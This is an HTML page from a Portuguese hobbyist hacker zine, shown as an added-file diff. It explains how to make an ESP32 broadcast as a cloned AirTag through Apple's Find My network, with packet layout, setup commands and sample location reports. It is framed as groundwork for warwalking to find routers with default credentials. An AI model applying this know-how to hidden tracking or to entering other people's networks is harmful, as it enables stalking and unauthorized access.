@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Mapeando roteadores com microcontroladores | TRAMOIA 0x1</title>
+	<link rel="stylesheet" type="text/css" href="/style.css">
+</head>
+<body>
+<div class="background"></div>
+<div class="txtdiv"><pre id="artpre">
+                                                                                                                               
+  <g1>
+
+                                                       01<g1>
+ <g2>░<g1>██<ww>▀<ww>█████<g1>    <g2>░<g1>██<ww>▀<ww>████<g1>     <g2>░<ww>▀<ww>███████<g1>     <g2>░<ww>██<g1>▌  <g2>░<ww>██<g1>     <g2>░<g1>█<ww>▀<ww>████<g1>     ██<g1>   <g2>░<ww>▀▀<ww>██████<g1>
+  <g2>░░░<g1>██<g1>       <g2>░<g1>██<g2>░░░░<ww>█<g1>▌    <g2>░<g1>██<g2>░░░░<ww>██<g1>     <g2>░<g1>███<g1> <g2>░<g1>███<g1>    <g2>░<g1>██<g2>░░░░<ww>██<g1>   <g2>░<ww>██<g1>   <g2>░<g1>██<g2>░░░░<ww>██<g1>
+    <g2>░<g1>██       <g2>░<g1>██   <g2>░<ww>█<g1>▌    <g2>░<g1>██   <g2>░<ww>██<g1>     <g2>░<g1>██<g1> ██<g2>░<g1>██<g1>    <g2>░<g1>██   <g2>░<g1>██<g1>   <g2>░<g1>▓█<g1>   <g2>░<g1>██   <g2>░<ww>██<g1>
+    <g2>░<g1>██       <g2>░<g1>██████<ww>▀<g1>     <g2>░<g1>███████<g1>█     <g2>░<g1>██ 01<g2>░<g1>█<ww>▀<g1>    <g2>░<g1>██   <g2>░<g1>██   <g2>░<g1>█<ww>▀<g1>   <g2>░<g1>██████<ww>▀<ww>█<g1>
+    <g2>░<g1>█·       <g2>░<g1>██   ▀█     <g2>░<g1>▓█   <g2>░<g1>██     <g2>░<g1>▓█   <g2>░<g1>██    <g2>░<g1>▓█   <g2>░<g1>██   <g2>░<g1>█▓   <g2>░<g1>▓█   <g2>░<g1>██
+    <g2>░<g1>██       <g2>░<g1>██   <g2>░<g1>█     <g2>░<g1>█▓   <g2>░<g1>█▓     <g2>░<g1>▒    <g2>░<g1>█▓    <g2>░░<g1>▓   <g2>░<g1>▒▓   <g2>░<g1>█▓   <g2>░<g1>█▓   <g2>░<g1>█▓
+    <g2>░<g1>▓▓       <g2>░<g1>▓▓   <g2>░<g1>▓▌    <g2>░<g1>▓▓   <g2>░<g1>▓▒     <g2>░<g1>▓▒   <g2>░<g1>▓▒    <g2>░<g1>▒░   <g2>░<g1>▓░   <g2>░<g1>▒▒   <g2>░<g1>▓▓   <g2>░<g1>▓▒
+    <g2>░<g1>▒▓       <g2>░<g1>▓    <g2>░<g1>▓▌    <g2>░<g1>▓▒   <g2>░<g1>▓▓     <g2>░<g1>░▒   <g2>░░<g1>▓     <g2>░<g1>▒████░    <g2>░<g1>▓░   <g2>░<g1>▓▒   <g2>░░<g1>▓
+    <g2>░<g1>▓<g2>░<g1>       <g2>░<g1>▒░   <g2>░<g1>░▌    <g2>░<g1>▒░                 <g2>░<g1>▓▒                <g2>░<g1>░▒   <g2>░<g1>▒░   <g2>░<g1>▓█
+    <g2>░<g1>▒▓       <g2>░░<g1>▒          <g2>░<g1>▒                  <g2>░<g1>▒▓                <g2>░<g1>▒░   <g2>░<g1>▒·   <g2>░<g1>▓▒
+    <g2>░<g1>▒·       <g2>░<g1>▒           <g2>░<g1>▒                  <g2>░<g1>▓                 <g2>░<g1>▒░   <g2>░<g1>▒▓   <g2>░<g1>░▓
+    <g2>░▒<g1>▒                                        <g2>░<g1>▒░                  ░         <g2>░<g1>▒·
+    <g2>░░<ww>░<g1>                                          ░                            <g2>░░<g1>▒
+    ·░░                                                                       ░<g2>░░<g1>
+    <g2>░░<ww>░<g1><ww>  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒         <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  ▒▓░   ░░▒░  ··  ░▒   ·········  ░▒▓░········· ░▒░ ░▒·  ░░▓▒▒         <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  ░▒·    ░▒········░▒ ···☼·☼··☼··· ░▓· ···☼···☼··░▒░ ░▒▓   ░░▓         ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  ▒▒    ····☼·····················░▒░ ············░  ···  ░▒·          <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  ░░░  ···········☼·······☼··········░··········· ·· ···☼· ░░▒         <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>  ░░░····☼···············☼············☼··xd37@riseup.net···░░░         <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>   ·░····························☼··························░░         <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>   ······                                  ······∙∙∙∙∙∙∙∙∙∙∙·∙         <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>   ·····   Mapeando roteadores default    ·∙∙☼∙∙∙∙∙    ∙ ∙∙∙∙·         <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>   ····    usando microcontroladores     ·∙∙ ∙    ∙       ∙∙··         <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>   ····∙∙∙∙∙∙∙∙∙∙☼∙∙∙∙·∙∙☼∙···         ·☼∙∙     t         ∙··          <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>   ·∙☼∙∙∙☼∙∙∙:::::::::∙∙∙∙·∙∙∙∙···     ·        r      ∙  ∙ ·          ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>   ∙∙∙∙∙∙:::::       :::::::::∙∙∙∙∙·  ∙       trm 0x1    ∙☼:·          ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>   ·∙∙::::                   :::::∙∙∙∙∙     ∙       ∙  ∙∙∙·:·          ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>    ·:::                         ∙:::::∙∙∙∙··    ∙    ∙∙∙·:::·         <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>      ··                               :::::∙∙∙∙∙☼∙∙∙∙∙∙ :::∙ ·        ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>       ·                              ∙   ∙::::::···::::::    ·        <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>        ·~~{ conteudos                                                 <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>      ~{ 0 - intro                                                     <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>      ~{ 1 - entendendo o tracking da apple                            ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>      ~{ 2 - replicando uma airtag                                     <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>      ~{ 3 - juntando com DPWO                                         <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>      ~{ 4 - warwalking                                                <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>      ~{ 5 - conclusao                                                 ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  ~~{ 0 - intro                                                        <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  esse projeto pareceu digno de ser uma tramoia e                      <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  foi feito para divertir e mostrar que muito pode ser feito           <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  com hardware barato comum e pequeno, isso foi somente                ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  juntando 2 projetos que achei interessante e nao tem                 ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  como intuito ser muito tecnico                                       ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  como quase sempre vc pode achar codigos assim                        ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  de graca na internet facilmente e tudo ja esta                       ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  mt bem documentado em ingles pelo menos                              ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  entao a ideia tbm eh trazer um monte de pesquisas                    <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  diferentes comprimidas pelo portugues informal,                      <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  e em cima do mesmo topico incentivar                                 ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  a galera BR a dar mais atencao a isso e fazer as                     ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  proprias pesquisas/codigo, pq achei                                  <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  pouco conteudo em ptbr falando sobre e q                             <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  ta facil fazer um rastreador mt barateza                             ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  com qualquer ESP ou STM, a precisao nao eh tanto igual               ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  a de um GPS porem faz seu trabalho na maioria dos casos              ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  sempre quando vi sobre wardriving me deparei com                     ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  varias pessoas utilizando de modulos de GPS                          <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  para saber a localizacao, porem nao queria que                       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  isso fosse necessario apenas para saber as cordenadas                ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  de um SSID pra upar no WiGLE ou algo do tipo =P                      <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  queria algo alem disso, explorar redes mesmo                         ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  ai comecei a pensar no que podia fazer para nao                      <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  depender do GPS, e algumas semanas dps me deparei com                <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  um projeto chamado Openhaystack, que basicamente te                  ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  permite a replicar o sinal da sua chave da airtag (vc precisa de     ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  um apple ID para pegar a public key) e acompanhar                    ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  em tempo real! porem o codigo deles soh estava fazendo               ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  uma parte do que realmente queria fazer...                           ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  ~~{ 1 - entendendo o tracking da apple                               ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  agora vamos ver sobre como eh possivel                               <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  abusar dos dispositivos da apple para localizar seu                  ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  microcontrolador como uma airtag                                     <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  como essas comunicacoes sao sempre feitas por bluetooth,             <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  nada mais justo que olharmos melhor o pacote enviado                 <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  este pacote que fica sendo propagado por bluetooth tem 36 bytes e    <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  essa estrutura:                                                      ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>  -================-                                                   ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  Bytes | Conteudo                                                     <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  ------------------                                                   ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  0-5   |endereco do bluetooth                                         ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  ------------------                                                   <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  6     |tamanho do payload em bytes                                   ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  7     |tipo da propagacao (advertisement)                            <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  8-9   |ID da compania                                                <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  10    |tipo de Offline Finding                                       <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>  11    |tamanho do Offline Finding em bytes                           ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  12    |status (sim, 1byte para transmitir data como nivel de bateria)<g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  13-34 |Public Key bytes                                              ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  35    |Public key bits                                               ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  36    |hint                                                          ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  -================-                                                   <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  o endereco do bluetooth fica implementado em outra parte do codigo   <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  ja que ele faz em todos disponiveis envolta.                         ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  na pratica, esse eh o array de bytes q sao enviados:                 ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  static uint8_t adv_data[31] = {                                      ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>      0x1e, /* Tamanho do payload em bytes (30) */                     <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>      0xff, /* tipo da propagacao */                                   <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>      0x4c, 0x00, /* ID da compania (Apple) */                         ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>      0x12, 0x19, /* tamanho do Offline Finding em bytes */            <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>      0x00, /* Status */                                               ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Public Key */ ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                  ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                              <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>      0x00, /* First two bits */                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>      0x00, /* Hint (0x00) */                                          ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  };                                                                   ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  agora que ja entendemos os bytes que sao enviados por bluetooth,     <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  vamos entender melhor o fluxo do que esta acontecendo de fato        <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  ┌──────────┐                                                         ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  │servers da│       ┌──────┐                                          <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>  │apple     ├───────►seu pc│                                          ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  └──▲───────┘   [3] └──────┘                                          <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>     │ [2]                                                             <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  ┌──┼─────────┐                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  │dispositivos│     ┌──────────┐                                      <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  │aleatorios  ◄─────┼sua airtag│                                      <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  │da apple    │ [1] └──────────┘                                      <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  │por ai      │                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  └────────────┘                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  1 - os 31 bytes sao enviados para dispositivos envolta               <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  2 - os dispositivos aleatorios atualizam os servers da apple         <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  3 - basicamente vc pode interagir com os servers da apple agora de   <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>   varios jeitos diferentes                                            ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  ~~{ 2 - replicando uma airtag                                        <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  entao blz, primeiro passo foi portar o codigo em                     <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  <a src="https://github.com/seemoo-lab/openhaystack/blob/main/Firmware/ESP32/main/openhaystack_main.c">github.com/seemoo-lab/...ESP32/main/openhaystack_main.c·              </a><g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  para fazer funcionar no ESP32-S3 soh tive que criar uma funcao de    ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  _loop e fazer com que ele nao fizesse advertising quando o bluetooth <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  esta em modo ESP_BT_MODE_BLE, foi soh chamar                         <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  esp_ble_gap_stop_advertising()                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  denovo e o codigo funcionava! agora temos uma airtag com um          ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  hardware com um preco muito bom!                                     ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>  outro repo que vc vai precisar tbm eh o                              <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  <a src="https://github.com/MatthewKuKanich/FindMyFlipper">https://github.com/MatthewKuKanich/FindMyFlipper                     </a><g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  se vc for explorar o repositorio, vai perceber que                   <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  pode subir um docker com esse anisette-v3                            <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  em AirTagGeneration o arquivo request_reports.py                     <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  vai ser responsavel por retornar os dados do openhaystack,           ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  unica modificacao que fiz nesse codigo foi                           <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>      tag[&#x27;url&#x27;] = &#x27;https://www.openstreetmap.org/#map=18/&#x27; + str(     ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>          tag[&#x27;lat&#x27;]) + &#x27;/&#x27; + str(tag[&#x27;lon&#x27;])                          <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  para gerar o output sem link do googlemaps                           ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>  dentro de AirTagGeneration vc tbm pode gerar chaves com o            <g2>░░<g1>░<ww>
+    <g2>░░<g1>░<ww>  generate_keys.py vc vai precisar copiar seu &quot;Advertisement key:&quot;,    ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  decodificar o base64 e salvar em um arquivo                          <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>      echo &quot;&lt;base64-adv-key&gt;&quot;|base64 -d&gt;/tmp/chave                     ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  agr faca um hexdump da sua chave e substitua no codigo fonte do .ino <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  na linha 37 para usar sua chave publica                              ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>      xxd -i /tmp/chave /tmp/codigo.h                                  <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  esse eh um exemplo de output do request_reports.py                   <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  quando tudo da certo e vc ja propagou do microcontrolador para algum <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  device, agora vc ta puxando do server da apple                       ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  xd@pc ~/t/F/AirTagGeneration (main)&gt; python3 request_reports.py -H 10<g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  pyprovision is not installed, querying http://localhost:6969         <g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  └►for an anisette server·                                            <g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  200: 5 reports received.                                             <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  60 reports used.                                                     <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  {&#x27;lat&#x27;: -25.4321703, &#x27;lon&#x27;: -49.2669962, &#x27;conf&#x27;: 98, &#x27;status&#x27;: 0,    <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;timestamp&#x27;: 1725xxxxxx, &#x27;isodatetime&#x27;: &#x27;2024-0x-xxTxx:xx:xx&#x27;,     <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;key&#x27;: &#x27;xxx5eaefxxxb&#x27;, &#x27;url&#x27;:                                      <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;https://www.openstreetmap.org/#map=18/-25.4321703/-49.2669962&#x27;}   <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  {&#x27;lat&#x27;: -25.4325314, &#x27;lon&#x27;: -49.2668648, &#x27;conf&#x27;: 76, &#x27;status&#x27;: 0,    <g2>░░<g1>░<ww> 
+    <g2>░░<ww>░<g1><ww>  └►&#x27;timestamp&#x27;: 1725xxxxxx, &#x27;isodatetime&#x27;: &#x27;2024-0x-xxTxx:xx:xx&#x27;,     <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;key&#x27;: &#x27;xxx5eaefxxxb&#x27;, &#x27;url&#x27;:                                      <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;https://www.openstreetmap.org/#map=18/-25.4325314/-49.2668648&#x27;}   ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  {&#x27;lat&#x27;: -25.4371764, &#x27;lon&#x27;: -49.2657124, &#x27;conf&#x27;: 53, &#x27;status&#x27;: 0,    ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;timestamp&#x27;: 1725xxxxxx, &#x27;isodatetime&#x27;: &#x27;2024-0x-xxTxx:xx:xx&#x27;,     ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;key&#x27;: &#x27;xxx5eaefxxxb&#x27;, &#x27;url&#x27;:                                      ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;https://www.openstreetmap.org/#map=18/-25.4371764/-49.2657124&#x27;}   <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  {&#x27;lat&#x27;: -25.4377824, &#x27;lon&#x27;: -49.2674244, &#x27;conf&#x27;: 103, &#x27;status&#x27;: 0,   <g2>░░<g1>░<ww> 
+    <g2>░░<ww>░<g1><ww>  └►&#x27;timestamp&#x27;: 1725xxxxxx, &#x27;isodatetime&#x27;: &#x27;2024-0x-xxTxx:xx:xx&#x27;,     <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;key&#x27;: &#x27;xxx5eaefxxxb&#x27;, &#x27;url&#x27;:                                      <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;https://www.openstreetmap.org/#map=18/-25.4377824/-49.2674244&#x27;}   <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  {&#x27;lat&#x27;: -25.4380643, &#x27;lon&#x27;: -49.267303, &#x27;conf&#x27;: 46, &#x27;status&#x27;: 0,     <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;timestamp&#x27;: 1725xxxxxx, &#x27;isodatetime&#x27;: &#x27;2024-0x-xxTxx:xx:xx&#x27;,     <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;key&#x27;: &#x27;xxx5eaefxxxb&#x27;, &#x27;url&#x27;:                                      <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  └►&#x27;https://www.openstreetmap.org/#map=18/-25.4380643/-49.267303&#x27;}    <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  found:   [&#x27;xxxxeaexxxxx&#x27;]                                            ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  missing: []                                                          <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  agora preciso fazer o DPWO em C, pq dai consigo rodar nesses         <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  microcontroladores sim, poderia fazer com micropython tb mas n qro =P░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
